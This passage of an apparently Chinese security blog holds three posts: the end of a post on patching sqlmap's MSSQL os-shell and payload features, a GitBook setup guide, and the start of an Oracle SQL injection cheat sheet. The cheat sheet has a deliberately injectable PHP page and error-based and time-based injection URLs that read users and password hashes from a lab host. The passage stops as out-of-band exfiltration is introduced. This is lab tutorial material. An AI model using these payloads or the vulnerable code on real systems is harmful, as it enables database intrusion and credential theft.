<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>经过以上测试，还是有点收获的，毕竟能够执行命令了，而且知道了sqlmap无法通过MSSQL执行的原因以及修复方式。</p>
<h3 id="命令执行–os-shell"><a href="#命令执行–os-shell" class="headerlink" title="命令执行–os-shell"></a>命令执行–os-shell</h3><p><strong>成因：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一个问题：sqlmap创建的表填充字段时，字段内容不允许为空。</span><br><span class="line">第二个问题：多语句查询时，返回两条结果，而第二条结果包含两个字段内容。</span><br></pre></td></tr></table></figure>

<p><strong>修复：</strong></p>
<p>修改所有关于MSSQL创建表时字段属性，添加<code>NULL</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124行，创建表时字段名后加一个NULL</span></span><br><span class="line"><span class="comment"># 如下：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createSupportTbl</span>(<span class="params">self, tblName, tblField, tblType</span>):</span></span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % tblName, silent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Backend.isDbms(DBMS.MSSQL) <span class="keyword">and</span> tblName == self.cmdTblName:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT PRIMARY KEY IDENTITY, %s %s NULL)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(%s %s)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py  96行</span></span><br><span class="line">self.createSupportTbl(txtTbl, self.tblField, <span class="string">&quot;text&quot;</span>)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % hexTbl)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s NULL)&quot;</span> % (hexTbl, self.tblField, <span class="string">&quot;VARCHAR(4096)&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="注册表-–reg"><a href="#注册表-–reg" class="headerlink" title="注册表 –reg-[]"></a>注册表 –reg-[]</h3><p><strong>成因：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap无法读取注册表是因为路径中包含空格，导致参数被截断。</span><br></pre></td></tr></table></figure>

<p><strong>修复:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改上传路径：</span></span><br><span class="line"><span class="comment">#	全局搜索字符串：.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27行 注释掉原本语句，改为如下</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>

<h3 id="MSF-amp-CS联动"><a href="#MSF-amp-CS联动" class="headerlink" title="MSF&amp;CS联动"></a>MSF&amp;CS联动</h3><p><strong>成因：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload成功上传，但是解码时候，路径出现空格截断，导致命令错误。</span><br></pre></td></tr></table></figure>

<p><strong>修复：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376行，添加双引号</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>MSSQL</tag>
        <tag>SQLMap</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>我的Gitbook</title>
    <url>/posts/6a0a2b53/</url>
    <content><![CDATA[<p>知识比较零散，无法好好的整理，想整理成书，看上了Gitbook 。</p>
<a id="more"></a>

<h2 id="GitBook安装"><a href="#GitBook安装" class="headerlink" title="GitBook安装"></a>GitBook安装</h2><p>GitBook 是基于 Node.js，所以我们首先需要安装 Node.js（<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuL2Rvd25sb2FkLyVFRiVCQyU4OSVFRiVCQyU4QyVFNiU4OSVCRSVFNSU4OCVCMCVFNSVBRiVCOSVFNSVCQSU5NCVFNSVCOSVCMyVFNSU4RiVCMCVFNyU5QSU4NCVFNyU4OSU4OCVFNiU5QyVBQyVFNSVBRSU4OSVFOCVBMyU4NSVFNSU4RCVCMyVFNSU4RiVBRiVFMyU4MCU4Mg==">https://nodejs.org/en/download/），找到对应平台的版本安装即可。<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g gitbook-cli</span><br></pre></td></tr></table></figure>

<p>安装完之后，就会多了一个 <strong>gitbook</strong> 命令（如果没有，请确认上面的命令是否加了 <code>-g</code>）。</p>
<h2 id="GitBook使用"><a href="#GitBook使用" class="headerlink" title="GitBook使用"></a>GitBook使用</h2><ul>
<li>经过初始化<code>gitbook inits</code>之后，目录结构如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> π ~&#x2F;Desktop&#x2F;code&#x2F;book ❯ tree afile</span><br><span class="line">afile</span><br><span class="line">├── README.md</span><br><span class="line">└── SUMMARY.md</span><br><span class="line"></span><br><span class="line">0 directories, 2 files</span><br></pre></td></tr></table></figure>

<ul>
<li>SUMMARY.md即为目录页，填充目录页为如下格式：(以无序列表配合超链接的形式来书写)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* [前言](README.md)</span><br><span class="line">* [第一章：Web](第一章/readme.md)</span><br><span class="line">    * [第一节：SQL](第一章/sql.md)</span><br><span class="line">* [第二章：内网](第二章/readme.md)</span><br><span class="line">    * [第一节：工作组](第二章/readme.md)</span><br><span class="line">* [结束语](结束语/readme.md)</span><br><span class="line">* [作者言](作者言/readme.md)</span><br></pre></td></tr></table></figure>

<ul>
<li>再次使用<code>gitbook init</code>命令，即可自动生成超链接对应的目录和文件。</li>
</ul>
<p><img src="/posts/6a0a2b53/image-20201014173802348.png" alt="image-20201014173802348"></p>
<ul>
<li><code>gitbook serve</code>本地预览，是以网页版HTML格式，在地址栏打开即可（默认<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo0MDAw77yJ77yM5Y+v5L2/55SoYGdpdGJvb2s=">http://localhost:4000），可使用`gitbook<i class="fa fa-external-link-alt"></i></span> serve –port 8888`指定端口。</li>
</ul>
<h2 id="GitBook书籍生成"><a href="#GitBook书籍生成" class="headerlink" title="GitBook书籍生成"></a>GitBook书籍生成</h2><h3 id="默认格式为HTML"><a href="#默认格式为HTML" class="headerlink" title="默认格式为HTML"></a>默认格式为HTML</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> π ~/Desktop/code/book/afile ❯ gitbook build</span><br><span class="line">info: 7 plugins are installed</span><br><span class="line">info: 6 explicitly listed</span><br><span class="line">info: loading plugin <span class="string">&quot;highlight&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;search&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;lunr&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;sharing&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;fontsettings&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;theme-default&quot;</span>... OK</span><br><span class="line">info: found 6 pages</span><br><span class="line">info: found 0 asset files</span><br><span class="line">info: &gt;&gt; generation finished with success <span class="keyword">in</span> 0.5s !</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成后的HTML书格式</span></span><br><span class="line">π ~/Desktop/code/book/afile ❯ tree _book</span><br><span class="line">_book</span><br><span class="line">├── gitbook</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   │   └── fontawesome</span><br><span class="line">│   │       ├── FontAwesome.otf</span><br><span class="line">│   │       ├── fontawesome-webfont.eot</span><br><span class="line">│   │       ├── fontawesome-webfont.svg</span><br><span class="line">│   │       ├── fontawesome-webfont.ttf</span><br><span class="line">│   │       ├── fontawesome-webfont.woff</span><br><span class="line">│   │       └── fontawesome-webfont.woff2</span><br><span class="line">│   ├── gitbook-plugin-fontsettings</span><br><span class="line">│   │   ├── fontsettings.js</span><br><span class="line">│   │   └── website.css</span><br><span class="line">│   ├── gitbook-plugin-highlight</span><br><span class="line">│   │   ├── ebook.css</span><br><span class="line">│   │   └── website.css</span><br><span class="line">│   ├── gitbook-plugin-lunr</span><br><span class="line">│   │   ├── lunr.min.js</span><br><span class="line">│   │   └── search-lunr.js</span><br><span class="line">│   ├── gitbook-plugin-search</span><br><span class="line">│   │   ├── lunr.min.js</span><br><span class="line">│   │   ├── search-engine.js</span><br><span class="line">│   │   ├── search.css</span><br><span class="line">│   │   └── search.js</span><br><span class="line">│   ├── gitbook-plugin-sharing</span><br><span class="line">│   │   └── buttons.js</span><br><span class="line">│   ├── gitbook.js</span><br><span class="line">│   ├── images</span><br><span class="line">│   │   ├── apple-touch-icon-precomposed-152.png</span><br><span class="line">│   │   └── favicon.ico</span><br><span class="line">│   ├── style.css</span><br><span class="line">│   └── theme.js</span><br><span class="line">├── index.html</span><br><span class="line">├── search_index.json</span><br><span class="line">├── �\234�\200\205�\200</span><br><span class="line">│   └── readme.html</span><br><span class="line">├── 第�\200章</span><br><span class="line">│   ├── readme.html</span><br><span class="line">│   └── sql.html</span><br><span class="line">├── 第�\214章</span><br><span class="line">│   └── readme.html</span><br><span class="line">└── �\223�\235\237语</span><br><span class="line">    └── readme.html</span><br><span class="line"></span><br><span class="line">13 directories, 29 files</span><br></pre></td></tr></table></figure>

<h3 id="PDF格式"><a href="#PDF格式" class="headerlink" title="PDF格式"></a>PDF格式</h3><p>(需要安装<span class="exturl" data-url="aHR0cHM6Ly9jYWxpYnJlLWVib29rLmNvbS8=">https://calibre-ebook.com<i class="fa fa-external-link-alt"></i></span>)</p>
<ul>
<li><del>本站MAC版下载地址：</del>(大于100M报错)如果是仅仅为了解决Hexo博客不能部署的问题，可以删除 博客目录的 <code>.deploy_git</code>文件夹下的 <code>.git</code>子文件夹(大文件的历史就保存在该文件下）。然后在 <code>.deploy_git</code>文件夹目录下重新<code>git init</code> ，再回到hexo项目的根目录下重新<code>hexo g</code> 、<code>hexo d</code>就行了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果没有配置环境变量，请手动添加</span></span><br><span class="line"><span class="comment"># npm install ebook-convert (有人说这样可以，但是试了一下并不行)</span></span><br><span class="line">ln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> π ~/Desktop/code/book/afile ❯ gitbook pdf</span><br><span class="line">info: 7 plugins are installed</span><br><span class="line">info: 6 explicitly listed</span><br><span class="line">info: loading plugin <span class="string">&quot;highlight&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;search&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;lunr&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;sharing&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;fontsettings&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;theme-default&quot;</span>... OK</span><br><span class="line">info: found 6 pages</span><br><span class="line">info: found 0 asset files</span><br><span class="line">info: &gt;&gt; generation finished with success <span class="keyword">in</span> 5.1s !</span><br><span class="line">info: &gt;&gt; 1 file(s) generated</span><br></pre></td></tr></table></figure>

<p>生成的文件在当前文件夹下，即书的根目录。</p>
<p><img src="/posts/6a0a2b53/image-20201015094305160.png" alt="image-20201015094305160"></p>
<h3 id="Epub格式"><a href="#Epub格式" class="headerlink" title="Epub格式"></a>Epub格式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gitbook epub</span><br></pre></td></tr></table></figure>



<ul>
<li>以上所有均在本地，如需同步Github等平台，按照平常同步即可。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init </span><br><span class="line">git remote add origin https://github.com/xx/xx.git</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;add book&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>



<p>祝您生活愉快！</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>gibook</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle小结</title>
    <url>/posts/bb8356a5/</url>
    <content><![CDATA[<p>Oracle注入常用方法与命令执行的常用方法。</p>
<a id="more"></a>

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>oracle</p>
<p>这里测试环境版本：<code>Oracle Database 11g Release 11.2.0.1.0 - 64bit Production</code></p>
</li>
<li><p>PHP</p>
<p>这里使用的是最新版的PHPSTUDY V8.1，默认安装的PHP版本为7.3，下载PHP的关于oracle的组件。将<code>php_oci8_11g.dll</code>,<code>php_oci8.dll</code>放在PHP安装文件夹的ext文件夹下。然后再php.ini中开启如下设置：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extension&#x3D;php_oci8.dll</span><br><span class="line">extension&#x3D;php_oci8_11g.dll</span><br><span class="line"># 查看phpinfo时候，可以看到OCI8即可。</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/001.png" alt="image-20200602112233342"></p>
<h3 id="注入点构建"><a href="#注入点构建" class="headerlink" title="注入点构建"></a>注入点构建</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">///*</span></span><br><span class="line">$con = oci_connect(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;127.0.0.1/orcl.unicodesec&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;connected &quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Input:&quot;</span>.$id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	$sql = <span class="string">&quot;select id,username,password,phone from admin where id = &quot;</span>.$id;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$sql.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$stmt = oci_parse($con, $sql);</span><br><span class="line">	oci_execute($stmt);</span><br><span class="line">	$nrows = oci_fetch_all($stmt, $results);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($nrows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;table border=\&quot;1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;th&gt;<span class="subst">$key</span>&lt;/th&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $nrows; $i++) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $data) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">$data</span>[<span class="subst">$i</span>]&lt;/td&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;\n&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;No data found&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/002.png" alt="image-20200602144555521"></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTklQUElQTglRTYlOTYlODclRTUlODUlQUMlRTUlOEYlQjgvNDMwMTE1">甲骨文公司<i class="fa fa-external-link-alt"></i></span>的一款<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlQjMlRTclQjMlQkIlRTYlOTUlQjAlRTYlOEQlQUUlRTUlQkElOTMlRTclQUUlQTElRTclOTAlODYlRTclQjMlQkIlRTclQkIlOUYvMTEwMzIzODY=">关系数据库管理系统<i class="fa fa-external-link-alt"></i></span>。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
<li>select 必须要指明表名。若并非对真实的表进行查询，则需要用 <code>dual</code> 作为表名。</li>
<li>单引号与双引号：Oracle 的单引号与 MySQL 一致，但是双引号用于消除系统关键字。例如，有个表的字段叫<code>sysdate</code>，因为<code>sysdate</code>属于<code>oracle</code>中的关键字，但你要查询这个字段的时候，就需要<code>select &quot;sysdate&quot; from dual;</code>，若用 <code>select &#39;sysdate&#39; from table_name;</code>查询就相当于 <code>select sysdate from table_name;</code>，而<code>sysdate</code> 用于获得当前时间。</li>
<li>第 n 行的数据：<code>SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;</code>。</li>
<li>拼接字符：<code>SELECT &#39;a&#39; || &#39;b&#39; FROM dual;</code>。</li>
<li><code>case 语法</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code>。</li>
<li>Oracle 中空字符串<code>&#39;&#39;</code>就是<code>null</code>（也就是说，只有<code>null</code>，没有空字符）。</li>
</ul>
<h3 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h3><ul>
<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
<li>all_tables : 当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</li>
<li>user_tables: 当前用户名下的表的信息</li>
<li>DBA_ALL_TABLES：<code>DBA</code> 用户所拥有的或有访问权限的对象和表</li>
<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
</ul>
<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><ul>
<li>服务器版本：<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code> 或者 <code>SELECT version FROM v$instance;</code>。</li>
<li>操作系统版本：<code>SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</code>。</li>
<li>当前数据库：<code>SELECT global_name FROM global_name;</code> 或者 <code>SELECT name FROM v$database;</code>或者<code>SELECT instance_name FROM v$instance;</code>或者<code>SELECT SYS.DATABASE_NAME FROM DUAL;</code>。</li>
<li>获取当前用户权限的所有数据库：<code>SELECT DISTINCT owner, table_name FROM all_tables;</code></li>
<li>表名：<code>SELECT table_name FROM all_tables;</code>。</li>
<li>字段名：<code>SELECT column_name FROM all_tab_columns</code>。</li>
</ul>
<h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><p>描述：<code>Oracle</code>。</p>
<ul>
<li>当前数据库用户：<code>SELECT user FROM dual;</code>。</li>
<li>所有数据库用户：<code>SELECT username FROM all_users ORDER BY username;</code> 或者 <code>SELECT name FROM sys.user$; -- priv</code>。</li>
<li>所有数据库用户的密码 hash：<code>SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g</code> 或者 <code>SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g</code>。</li>
<li>当前用户的权限：<code>SELECT * FROM session_privs;</code>。</li>
<li>所有用户的权限：<code>SELECT * FROM dba_sys_privs -- priv</code>。</li>
<li>用户角色：<code>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</code> 或者 <code>SELECT DISTINCT grantee FROM dba_sys_privs</code>。</li>
</ul>
<h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>没有什么过滤的情况下，Sqlmap一把梭是最快的。不过，还是需要了解一下常用的Oracle注入方式。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>直接来就好了，毕竟页面显示。</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://172.16.49.137/oracle.php?id=1 union <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">user</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.16</span><span class="number">.49</span><span class="number">.137</span>/oracle.php?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> utl_inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/003.png" alt="image-20200702172913714"></p>
<ul>
<li><code>decode</code>函数，如果正确则为1，错误为2。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select decode(substr(user, 1, 1), &#39;t&#39;, (1&#x2F;1),2) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>instr</code>判断给出的字符串1是否在字符串2中。正确为1，错误为0.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select instr((select user from dual),&#39;admin&#39;) FROM dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>utl_inaddr.get_host_name</code>这种方法在 <code>Oracle 8g</code>，<code>9g</code>，<code>10g</code>中不需要任何权限但是在<code>Oracle 11g</code>以及以后的版本中，官方加强了访问控制权限，所以在<code>11g</code>以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/004.png" alt="image-20200703093602971"></p>
<ul>
<li><code>ctxsys.drithsx.sn</code>Oracle 中用于处理文本，当传入参数类型错误时，会返回异常。</li>
</ul>
<p><img src="/posts/bb8356a5/005.png" alt="image-20200703093747004"></p>
<ul>
<li><code>CTXSYS.CTX_REPORT.TOKEN_TYPE</code>作用与 <code>ctxsys.drithsx.sn</code> 类似，用于处理文本。确保数据类型与前面语句一致，这里只能使用phone字段，<code>number</code>型，允许为空。。。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/006.png" alt="image-20200703094207462"></p>
<ul>
<li><code>XMLType</code> 在调用的时候必须以<code>&lt;:</code>开头，<code>&gt;</code>结尾，即 <code>&#39;&lt;:&#39;||balabala||&#39;&gt;&#39;</code> 或者 <code>chr(60)||balabal||chr(62）</code>。另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual;</span><br><span class="line">⚠️注意：该函数对应的数据类型为：XMLTYPE，使用unionc select 可能无法对应数据类型。</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual) is not null </span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/007.png" alt="image-20200703101217646"></p>
<ul>
<li><code>dbms_xdb_version.checkin</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum&#x3D;1)) from dual) is not null s</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/008.png" alt="image-20200703101002277"></p>
<ul>
<li><code>dbms_xdb_version.makeversioned</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dbms_xdb_version.uncheckout</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dbms_utility.sqlid_to_sqlhash</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ordsys.ord_dicom.getmappingxpath</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>UTL_INADDR.get_host_address</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔和时间盲注，参考如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用时间延迟函数配合replace和substr以及decode来进行注入</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and DBMS_PIPE.RECEIVE_MESSAGE(&#39;cc&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 3))&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;cc&#39;,3),0) from dual) is not null</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/009.png" alt="image-20200703153315774"></p>
<h3 id="OOB外带"><a href="#OOB外带" class="headerlink" title="OOB外带"></a>OOB外带</h3><p>带外通信即使用 Oracle 发送<code>HTTP</code>或者<code>DNS</code>请求，将查询结果带到请求中，然后监测外网服务器的<code>HTTP</code>和<code>DNS</code>日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度。类似于 Windows 的MySQL 中利用 <code>LOAD_FILE</code> 的 dns 带外通信。</p>
<p>借用DNSlog/CEYE的payload，尝试。</p>
<ul>
<li><code>utl_http.request()</code> 向外网主机发送 <code>http</code> 请求:</li>
</ul>
